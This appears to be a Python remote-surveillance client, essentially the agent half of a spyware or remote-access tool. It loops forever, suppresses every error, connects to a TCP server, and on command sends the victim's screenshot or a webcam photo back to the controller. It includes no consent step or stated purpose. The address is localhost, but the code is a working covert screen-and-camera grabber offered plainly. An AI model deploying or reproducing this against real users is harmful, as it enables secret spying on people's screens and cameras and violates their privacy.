from socket import *
import sys
import pyautogui
import numpy as np
import cv2
host = 'localhost'
port = 6522
addr = (host,port)
while True:
	try:
		tcp_socket = socket(AF_INET, SOCK_STREAM)
		tcp_socket.connect(addr)
		data = "Connected"
		if not data : 
		    tcp_socket.close() 
		    sys.exit(1)

		data = str.encode(data)
		tcp_socket.send(data)
		data = bytes.decode(data)
		data = tcp_socket.recv(1024)
		data = data.decode()
		if data == "1":
			scr = pyautogui.screenshot()
			scr.save('screen.png')
			screen = open("screen.png", "rb")
			image_data = screen.read(2048)
			while image_data:
				tcp_socket.send(image_data)
				image_data = screen.read(2048)
		elif data == "2":
			videoCaptureObject = cv2.VideoCapture(0)
			result = True
			while(result):
				ret,frame = videoCaptureObject.read()
				cv2.imwrite("NewPicture.jpg",frame)
				result = False
			videoCaptureObject.release()
			cv2.destroyAllWindows()
			photo = open("NewPicture.jpg", "rb")
			image_data = photo.read(2048)
			while image_data:
				tcp_socket.send(image_data)
				image_data = photo.read(2048)
		tcp_socket.close()	
	except:
		pass
